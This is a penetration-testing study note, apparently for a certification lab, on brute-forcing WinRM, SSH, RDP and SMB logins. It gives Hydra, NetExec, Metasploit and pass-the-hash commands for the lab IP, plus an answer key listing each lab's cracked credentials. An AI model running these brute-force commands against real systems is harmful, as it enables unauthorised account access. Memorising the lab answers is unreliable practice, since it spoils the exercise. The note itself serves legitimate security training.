# NOTE — Network Services

## ID
509

## Module
Password Attacks

## Kind
methodology

## Title
Section 8 — Network Services

## Description
Online brute-forcing against WinRM, SSH, RDP, and SMB using NetExec, Hydra, Metasploit, Evil-WinRM, xfreerdp, and smbclient.

## Tags
winrm, ssh, rdp, smb, netexec, crackmapexec, hydra, evil-winrm, xfreerdp, smbclient

## Commands
- `netexec winrm <ip> -u user.list -p password.list`
- `evil-winrm -i <ip> -u <user> -p <pass>`
- `hydra -L user.list -P password.list ssh://<ip>`
- `ssh <user>@<ip>`
- `hydra -L user.list -P password.list rdp://<ip>`
- `xfreerdp /v:<ip> /u:<user> /p:<pass>`
- `netexec smb <ip> -u "<user>" -p "<pass>" --shares`
- `smbclient -U <user> //<ip>/<share>`

## Concept Overview
Most network services accept username+password auth and can be brute-forced online (over the network). This section covers the four most useful from a CPTS perspective: WinRM (TCP 5985/5986), SSH (TCP 22), RDP (TCP 3389), SMB (TCP 445).

## Service → Tool Quick Reference

| Service | Port | Brute-force tool | Interactive tool |
|---------|------|------------------|------------------|
| **WinRM** | 5985/5986 | `netexec winrm` | `evil-winrm` |
| **SSH** | 22 | `hydra ssh://` | `ssh` |
| **RDP** | 3389 | `hydra rdp://` or `netexec rdp` | `xfreerdp` / `rdesktop` |
| **SMB** | 445 | `netexec smb` or `msf scanner/smb/smb_login` | `smbclient`, `smbmap` |

## WinRM
WinRM = Microsoft's remote management protocol (XML/SOAP over HTTP). Disabled by default on Windows 10/11; commonly enabled on servers. The `(Pwn3d!)` tag in NetExec output = the user can execute commands.

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
evil-winrm -i 10.129.42.197 -u user -p password
```

## SSH
```bash
hydra -L user.list -P password.list ssh://10.129.42.197
ssh user@10.129.42.197
```
Hydra warning: SSH servers often rate-limit. Reduce with `-t 4`.

## RDP
```bash
hydra -L user.list -P password.list rdp://10.129.42.197
xfreerdp /v:10.129.42.197 /u:user /p:password
```
Useful xfreerdp flags:
- `/dynamic-resolution` — resize on the fly
- `/drive:linux,.` — share local CWD as a drive in the RDP session (for file transfer)
- `/pth:<hash>` — pass-the-hash mode (requires RestrictedAdmin enabled)

## SMB
NetExec is best for SMB brute-force; old Hydra versions fail with "invalid reply" against SMBv3. Fall back to Metasploit's `auxiliary/scanner/smb/smb_login` if needed.

```bash
netexec smb 10.129.42.197 -u user.list -p password.list
netexec smb 10.129.42.197 -u "user" -p "password" --shares
smbclient -U user '\\10.129.42.197\SHARENAME'
```

### Metasploit Fallback
```
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set USER_FILE user.list
msf6 > set PASS_FILE password.list
msf6 > set RHOSTS <ip>
msf6 > run
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — WinRM user + flag | **(hidden — `john:november`)** | `netexec winrm <ip> -u user.list -p password.list` then `evil-winrm` and read flag.txt |
| Q2 — SSH user + flag | **(hidden — `dennis:rockstar`)** | `hydra -L user.list -P password.list ssh://<ip>` then `ssh` and read flag |
| Q3 — RDP user + flag | **(hidden — `chris:789456123`)** | `hydra -I -L user.list -P password.list rdp://<ip>` then `xfreerdp` |
| Q4 — SMB user + flag | **(hidden — `cassie:12345678910`)** | Metasploit `smb_login` against `user.list`/`password.list`, then `smbclient` to download `flag.txt` from the `CASSIE` share |

## Key Takeaways
- NetExec replaced CrackMapExec — same syntax, actively maintained. Both names work in muscle memory.
- `(Pwn3d!)` in NetExec output = local admin / execution-capable on that protocol.
- For Hydra RDP, add `-I` to ignore session-restriction warnings ("account not active for remote desktop").
- For interactive SMB enumeration, `smbclient -L //ip/` lists shares; `smbclient //ip/share` connects.
- Combine credential discovery → `--shares` enumeration → `--spider` content search to find the loot fast.

## Gotchas
- WinRM by default uses HTTP on 5985 — no TLS. HTTPS variant is 5986.
- `xfreerdp` cert prompt: type `Y` to accept self-signed certs; otherwise the connection drops silently.
- Hydra SMB with old versions returns "invalid reply" against modern Samba/SMBv3 — switch to NetExec or Metasploit.
- For Active Directory password spraying, always check the lockout policy first or you'll lock everyone out.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[07-cracking-protected-archives]] | [[09-spraying-stuffing-defaults]] →
<!-- AUTO-LINKS-END -->
